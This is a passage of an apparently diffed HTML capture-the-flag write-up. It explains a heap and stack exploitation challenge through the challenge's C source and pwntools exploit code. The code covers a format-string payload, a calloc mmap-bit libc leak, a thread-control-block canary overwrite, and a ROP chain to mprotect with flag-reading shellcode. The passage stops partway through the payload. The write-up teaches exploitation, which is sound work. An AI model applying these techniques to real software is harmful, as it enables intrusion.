+</span><span>    payload </span><span style=color:#f29668>= </span><span>(</span><span style=color:#c2d94c>'%*18$d' </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'%15$n'</span><span>)</span><span style=color:#f29668>.</span><span style=color:#ffb454>ljust</span><span>(</span><span style=color:#f29718>16</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(region)
+</span><span>    </span><span style=color:#ffb454>sa</span><span>(</span><span style=color:#c2d94c>"Name: "</span><span style=color:#bfbab0cc>,</span><span>payload)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>"Age: "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"123"</span><span>)
+</span><span>    </span><span style=color:#ffb454>sleep</span><span>(</span><span style=color:#f29718>1</span><span>)
+</span><span>
+</span><span>
+</span></code></pre><p>With this , we satisfy all checks and enter the secret service.<p>The secret service is pretty much a commonplace menu driven code with <code>Enroll</code> , <code>View</code> , <code>Remove</code> and an extra functionality which I termed as <code>Hack</code>. Later on , a feedback is requested which initialises a separate thread to do stuff.<p>But why so much obfuscation just to take a feedback , there's a reason for that guys, hold your horses.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>secret_service</span><span>()
+</span><span>{
+</span><span>    
+</span><span>    </span><span style=font-style:italic;color:#39bae6>pthread_t</span><span> t1</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>while</span><span>(</span><span style=color:#f29718>1</span><span>)
+</span><span>    {
+</span><span>        </span><span style=color:#ff7733>unsigned int</span><span> option </span><span style=color:#f29668>= </span><span style=color:#ffb454>menu</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>switch</span><span>(option)
+</span><span>        { 
+</span><span>            </span><span style=color:#ff7733>case </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>: </span><span style=color:#ffb454>Enroll</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>case </span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>: </span><span style=color:#ffb454>View</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>case </span><span style=color:#f29718>3</span><span style=color:#bfbab0cc>: </span><span style=color:#ffb454>Remove</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>case </span><span style=color:#f29718>4</span><span style=color:#bfbab0cc>: </span><span style=color:#ff7733>goto</span><span> Move_On</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>case </span><span style=color:#f29718>2020</span><span style=color:#bfbab0cc>: </span><span style=color:#ffb454>Hack</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>break</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>case </span><span style=color:#f29718>5</span><span style=color:#bfbab0cc>: </span><span style=color:#f07178>exit</span><span>(EXIT_SUCCESS)</span><span style=color:#bfbab0cc>;
+</span><span>        }
+</span><span>    }
+</span><span>    </span><span style=color:#59c2ff>Move_On</span><span style=color:#bfbab0cc>:
+</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Do u want to leave a feedback for the service?(y/n)"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#f07178>scanf</span><span>(</span><span style=color:#c2d94c>"</span><span style=color:#f29718>%c</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>&</span><span>ch)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f29668>!</span><span style=color:#f07178>strcmp</span><span>(</span><span style=color:#f29668>&</span><span>ch</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>"y"</span><span>))
+</span><span>    {
+</span><span>        </span><span style=color:#ffb454>pthread_create</span><span>(</span><span style=color:#f29668>&</span><span>t1</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>NULL</span><span style=color:#bfbab0cc>,</span><span>thread_entry</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>NULL</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ffb454>pthread_join</span><span>(t1</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>NULL</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#ff7733>else
+</span><span>    {
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Thank you!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#f07178>exit</span><span>(EXIT_SUCCESS)</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span></code></pre><p>Let's see how we can hack the secret service before getting into the feedback part.<ol><li>The <code>Enroll</code> Function</ol><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=font-style:italic;color:#5c6773>//Enroll with the use of safe calloc
+</span><span style=color:#ff7733>void </span><span style=color:#ffb454>Enroll</span><span>()
+</span><span>{
+</span><span>    </span><span style=color:#ff7733>if</span><span>(enrolled</span><span style=color:#f29668><=</span><span style=color:#f29718>2</span><span>)
+</span><span>    {
+</span><span>        </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Enter Enrollment Index : "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>unsigned int</span><span> index </span><span style=color:#f29668>= </span><span style=color:#ffb454>getInt</span><span>()</span><span style=color:#bfbab0cc>,</span><span>size</span><span style=color:#bfbab0cc>; 
+</span><span>        </span><span style=color:#ff7733>if</span><span>(is_enrolled[index] </span><span style=color:#f29668>||</span><span> index </span><span style=color:#f29668>< </span><span style=color:#f29718>0 </span><span style=color:#f29668>||</span><span> index </span><span style=color:#f29668>> </span><span style=color:#f29718>2</span><span>)
+</span><span>        {
+</span><span>            </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Invalid or already enrolled!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>        }
+</span><span>        </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Enter size : "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        size </span><span style=color:#f29668>= </span><span style=color:#ffb454>getInt</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>if</span><span>(size</span><span style=color:#f29668><</span><span style=color:#f29718>0x7f </span><span style=color:#f29668>||</span><span> size</span><span style=color:#f29668>>=</span><span style=color:#f29718>65530</span><span>)
+</span><span>        {
+</span><span>            </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Size not allowed!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ffb454>Exit</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>        }
+</span><span>        sizes[index] </span><span style=color:#f29668>=</span><span> size</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Enter your details -> "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>char </span><span style=color:#f29668>*</span><span>details </span><span style=color:#f29668>= </span><span>(</span><span style=color:#ff7733>char </span><span style=color:#f29668>*</span><span>)</span><span style=color:#f07178>calloc</span><span>(sizes[index]</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>1</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>       </span><span style=font-style:italic;color:#5c6773>// printf("Allocation happened at -> %llx\n",details); Debug info , dont mind
+</span><span>        </span><span style=color:#ffb454>getInp</span><span>(details</span><span style=color:#bfbab0cc>,</span><span>sizes[index])</span><span style=color:#bfbab0cc>;
+</span><span>        enrolled_table[index] </span><span style=color:#f29668>=</span><span> details</span><span style=color:#bfbab0cc>;
+</span><span>        is_enrolled[index] </span><span style=color:#f29668>= </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
+</span><span>        enrolled</span><span style=color:#f29668>++</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Ok! You are enrolled now"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#ff7733>else
+</span><span>    {
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"No more enrollments allowed!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>}
+</span><span>
+</span><span>
+</span></code></pre><p>More or less, you can presume that it is safe.<ol start=2><li>The <code>view</code> Function</ol><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>View</span><span>()
+</span><span>{
+</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Enter index of the Enrolled Candidate: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>unsigned int</span><span> index </span><span style=color:#f29668>= </span><span style=color:#ffb454>getInt</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f29668>!</span><span>enrolled_table[index] </span><span style=color:#f29668>|| !</span><span>is_enrolled[index] </span><span style=color:#f29668>||</span><span> index</span><span style=color:#f29668><</span><span style=color:#f29718>0 </span><span style=color:#f29668>||</span><span> index </span><span style=color:#f29668>> </span><span style=color:#f29718>2</span><span>)
+</span><span>    {
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Invalid Index!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=font-style:italic;color:#5c6773>//printf("Viewing chunk %llx\n",enrolled_table[index]);
+</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Details of Candidate </span><span style=color:#f29718>%u</span><span style=color:#c2d94c>: </span><span style=color:#f29718>%s</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>index</span><span style=color:#bfbab0cc>,</span><span>enrolled_table[index])</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span></code></pre><p>There's no use <code>view-after-free</code> with all those checks in plain sight.<ol start=3><li>The <code>Hack</code> function</ol><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>Hack</span><span>()
+</span><span>{
+</span><span>    </span><span style=color:#ff7733>if</span><span>(hacked</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>)
+</span><span>    {
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"No more hacking allowed!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Enter index of Enrolled Candidate: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>unsigned int</span><span> index </span><span style=color:#f29668>= </span><span style=color:#ffb454>getInt</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f29668>!</span><span>enrolled_table[index] </span><span style=color:#f29668>||</span><span> index</span><span style=color:#f29668><</span><span style=color:#f29718>0 </span><span style=color:#f29668>||</span><span> index </span><span style=color:#f29668>> </span><span style=color:#f29718>2</span><span>)      
+</span><span>    {                                  
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Invalid Index!"</span><span>)</span><span style=color:#bfbab0cc>;        
+</span><span>        </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;                        
+</span><span>    }
+</span><span>    </span><span style=color:#ff7733>char</span><span style=color:#f29668>*</span><span> hack_addr </span><span style=color:#f29668>=</span><span> enrolled_table[index] </span><span style=color:#f29668>- </span><span style=color:#f29718>8</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=font-style:italic;color:#5c6773>//printf("Hacking chunk %llx\n",hack_addr);
+</span><span>    </span><span style=color:#f29668>*</span><span>(hack_addr) </span><span style=color:#f29668>+=</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
+</span><span>    hacked</span><span style=color:#f29668>++</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span></code></pre><p>Well this function is obviously vulnerable as the name suggests<ul><li>It lets you hack a free chunk.<li>It lets you add <strong>1</strong> to the size of any chunk (free/allocated) but only twice in the whole program.</ul><p>So what can we do with this?<p>If we can add <strong>2</strong> to the size of a free chunk , we end up setting the <code>mmap-bit</code> of the free chunk , and thus we can fool calloc to return an uninitialized piece of memory. {: .notice}<p>What this means is that , calloc considers the chunk to be mapped chunk and thus does not call <code>memset</code> internally and this sets up our libc leak.<ol start=3><li>The <code>Remove</code> function</ol><pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=font-style:italic;color:#5c6773>//Remove function , nulls out the is_enrolled bit , but doesnt null out the table
+</span><span style=color:#ff7733>void </span><span style=color:#ffb454>Remove</span><span>()
+</span><span>{
+</span><span>    </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Enter index of Enrolled Candidate: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>unsigned int</span><span> index </span><span style=color:#f29668>= </span><span style=color:#ffb454>getInt</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f29668>!</span><span>enrolled_table[index] </span><span style=color:#f29668>|| !</span><span>is_enrolled[index] </span><span style=color:#f29668>||</span><span> index</span><span style=color:#f29668><</span><span style=color:#f29718>0 </span><span style=color:#f29668>||</span><span> index </span><span style=color:#f29668>> </span><span style=color:#f29718>2</span><span>)
+</span><span>    {
+</span><span>        </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Invalid Index"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=font-style:italic;color:#5c6773>//printf("Removing chunk %llx\n",enrolled_table[index]);
+</span><span>    </span><span style=color:#ff7733>if</span><span>(enrolled_table[index])
+</span><span>        </span><span style=color:#f07178>free</span><span>(enrolled_table[index])</span><span style=color:#bfbab0cc>;
+</span><span>    is_enrolled[index]</span><span style=color:#f29668>=</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>;
+</span><span>    enrolled</span><span style=color:#f29668>--</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span></code></pre><p>As you can see , the remove function doesn't null out the table , which lets us <code>hack</code> free chunks.<p>Now let's finish up the exploit until leaking libc.<p>Getting leaks with this information in hand is nothing but a trivial task.<pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span>
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Add 2 chunks ,one of which is uneffected by tcache
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x600</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'b'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x40</span><span>)
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x80</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'a'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x40</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Free first one to send to unsorted bin
+</span><span>    </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Send the unsorted bin to large bin
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>2</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0x1260</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'unsorted bin'</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Flip the bit to make the free chunk mapped , which could be used for leaking with calloc
+</span><span>    </span><span style=color:#ffb454>hack</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>    </span><span style=color:#ffb454>hack</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Now add that chunk to get uninitialised memory from calloc
+</span><span>    </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0xd10</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'d'</span><span style=color:#f29668>*</span><span style=color:#f29718>8</span><span>) </span><span style=font-style:italic;color:#5c6773>#0x10f0
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#view it to leak stuff
+</span><span>    </span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>0</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Leaks
+</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(</span><span style=color:#c2d94c>"d"</span><span style=color:#f29668>*</span><span style=color:#f29718>8</span><span>)
+</span><span>    libc_base </span><span style=color:#f29668>= </span><span style=color:#ffb454>u64</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>6</span><span>) </span><span style=color:#f29668>+ </span><span style=color:#c2d94c>'</span><span style=color:#95e6cb>\x00</span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>2</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x1ec1e0
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"libc_base = "</span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(libc_base))
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Done with leaks , move on
+</span></code></pre><p>After getting libc leak , there's not much you can do with the secret service , so , just move on :P.<h3 id=the-final-feedback>The Final Feedback</h3><p>We have entered the final stage of our program (and exploit too :P) , where we are requested to enter some feedback.<p>A separate thread is created which calls the thread handler function, <code>create_feedback</code>.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#f29668>*</span><span style=color:#ffb454>thread_entry</span><span>(</span><span style=color:#ff7733>void </span><span style=color:#f29668>*</span><span style=color:#f29718>arg</span><span>)
+</span><span>{
+</span><span>    </span><span style=color:#ffb454>create_feedback</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>return </span><span>(</span><span style=color:#ff7733>void </span><span style=color:#f29668>*</span><span>)</span><span style=color:#f29718>NULL</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span><span style=font-style:italic;color:#5c6773>//Create a new thread to handle feedback request
+</span><span style=color:#ff7733>void </span><span style=color:#ffb454>create_feedback</span><span>()
+</span><span>{
+</span><span>    </span><span style=color:#ff7733>char</span><span> feedback[</span><span style=color:#f29718>100</span><span>]</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"A new thread has been created for feedback"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>if</span><span>((</span><span style=color:#ff7733>unsigned long</span><span>)</span><span style=color:#f29668>&</span><span>feedback </span><span style=color:#f29668>< </span><span style=color:#ffb454>init_0</span><span>())
+</span><span>    {
+</span><span>        </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Enter size of feedback: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#f07178>scanf</span><span>(</span><span style=color:#c2d94c>"</span><span style=color:#f29718>%d</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>&</span><span>size)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#f07178>printf</span><span>(</span><span style=color:#c2d94c>"Enter feedback: "</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>if</span><span>(size</span><span style=color:#f29668>></span><span style=color:#f29718>0x70</span><span>)
+</span><span>        {
+</span><span>            </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Size too large"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>            </span><span style=color:#ffb454>Exit</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>        }
+</span><span>        </span><span style=color:#ff7733>unsigned int</span><span> fd_stdout </span><span style=color:#f29668>= </span><span style=color:#ffb454>supress_stdout</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ff7733>unsigned int</span><span> fd_stderr </span><span style=color:#f29668>= </span><span style=color:#ffb454>supress_stderr</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>        </span><span style=color:#ffb454>get_inp</span><span>(feedback</span><span style=color:#bfbab0cc>,</span><span>size)</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Thank you!"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span></code></pre><p>There's a plain integer overflow as there is no check for size being less than zero and size is <code>int</code>.<p>But there's a canary , how do we bypass it?<p>So here's the thing , we are getting write over a region known as <code>Thread Control Block</code>. This is the place from where canary is actually loaded into the fs segment register for the stack check fail. {: .notice}<p>Now we have plain overflow and we can assume there's no canary , cool isn't it?<p>Well what next?<h3 id=rop-and-shellcode-to-grab-that-flag>ROP And Shellcode To Grab That Flag</h3><p>The first thing that comes to mind is , call mprotect on the region we have overflow , and then shellcode. Well , thats it.<p>Let's script it till there.<pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span>    </span><span style=color:#ffb454>move_on</span><span>()
+</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>"service?(y/n)</span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'y'</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Trigger integer overflow with type confusion bug to get large write on stack
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>"feedback: "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'-1'</span><span>)
+</span><span>
+</span></code></pre><p>But as you would have noticed , a weird function <code>supress_stdout</code> is being called which redirects stdout to <code>/dev/null</code>. So how do we get around it? Simple , you just have to mimic it.<p>Now all we have to do is , write a simple shellcode.<p>Wait , one more thing , what about those seccomp constraints which let you read only from fd <code>0</code> and write only to fd <code>1</code>.<ol><li>To open flag at fd <code>0</code> , just close fd 0 and open flag , it will open at fd <strong>0</strong> itself.<li>Now you can read the flag at fd <strong>0</strong> and write it to stdout.</ol><p>Here's the remaining script.<pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span>    </span><span style=font-style:italic;color:#5c6773>#The shellcode first reopens stdout by mimicing the mechanism of supress_stdout function
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#It does so by calling dup2 , changing file descriptor of stdout back to 1
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Then we close stdin so that flag gets opened at fd 0.
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#After that , we call openat syscall to open flag at fd 0, as open is not allowed
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Finally we read flag in memory and write it out
+</span><span>    shellcode </span><span style=color:#f29668>= </span><span style=color:#ffb454>asm</span><span>(</span><span style=color:#c2d94c>'''
+</span><span style=color:#c2d94c>            xor rdi,rdi
+</span><span style=color:#c2d94c>            mov edi,DWORD PTR [rbp-0x88]
+</span><span style=color:#c2d94c>            mov rsi,1
+</span><span style=color:#c2d94c>            mov rax,33
+</span><span style=color:#c2d94c>            syscall
+</span><span style=color:#c2d94c>            mov rax,3
+</span><span style=color:#c2d94c>            syscall
+</span><span style=color:#c2d94c>            mov rax,3
+</span><span style=color:#c2d94c>            mov rdi,0
+</span><span style=color:#c2d94c>            xor rsi,rsi
+</span><span style=color:#c2d94c>            xor rdx,rdx
+</span><span style=color:#c2d94c>            syscall
+</span><span style=color:#c2d94c>            mov rax,257
+</span><span style=color:#c2d94c>            mov rdi,0xffffff9c
+</span><span style=color:#c2d94c>            mov r9,0x67616c66
+</span><span style=color:#c2d94c>            push r9
+</span><span style=color:#c2d94c>            push rsp
+</span><span style=color:#c2d94c>            pop rsi
+</span><span style=color:#c2d94c>            mov rdx,0
+</span><span style=color:#c2d94c>            mov r10,0644
+</span><span style=color:#c2d94c>            syscall
+</span><span style=color:#c2d94c>            mov rax,0
+</span><span style=color:#c2d94c>            mov rdi,0
+</span><span style=color:#c2d94c>            lea rsi,[rsp-0x200]
+</span><span style=color:#c2d94c>            mov rdx,0x50
+</span><span style=color:#c2d94c>            syscall
+</span><span style=color:#c2d94c>            mov rax,1
+</span><span style=color:#c2d94c>            mov rdi,1
+</span><span style=color:#c2d94c>            syscall
+</span><span style=color:#c2d94c>            '''</span><span>)
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Gadgets
+</span><span>    mprotect </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span>LIBC</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'mprotect'</span><span>]
+</span><span>    pop_rdi </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x0000000000026b72
+</span><span>    pop_rsi </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x0000000000027529
+</span><span>    pop_rdx_junk </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x00000000001626d6
+</span><span>    mmap_base </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>- </span><span style=color:#f29718>0x5000
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"mmap_base = " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(mmap_base))
+</span><span>    shellcode_addr </span><span style=color:#f29668>= </span><span>mmap_base </span><span style=color:#f29668>+ </span><span style=color:#f29718>0xf20
+</span><span>    fflush </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span>LIBC</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'fflush'</span><span>]
+</span><span>    stdout </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>+ </span><span>LIBC</span><span style=color:#f29668>.</span><span>symbols[</span><span style=color:#c2d94c>'_IO_2_1_stdout_'</span><span>]
+</span><span>    rbp </span><span style=color:#f29668>= </span><span>libc_base </span><span style=color:#f29668>- </span><span style=color:#f29718>0x4130
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Adding ROP chain for buffer overflow vuln, the idea is to overwrite TCB structure from where the segment register actually takes canary for checking ,thus overwriting the original canary and triggering overflow
+</span><span>    payload </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'a'</span><span style=color:#f29668>*</span><span style=color:#f29718>0x80 </span><span style=color:#f29668>+ </span><span style=color:#ffb454>p64</span><span>(rbp)
+</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(pop_rdi)
+</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(mmap_base)
+</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(pop_rsi)
+</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>0x10000</span><span>)
+</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(pop_rdx_junk)
+</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(</span><span style=color:#f29718>7</span><span>)</span><span style=color:#f29668>*</span><span style=color:#f29718>2
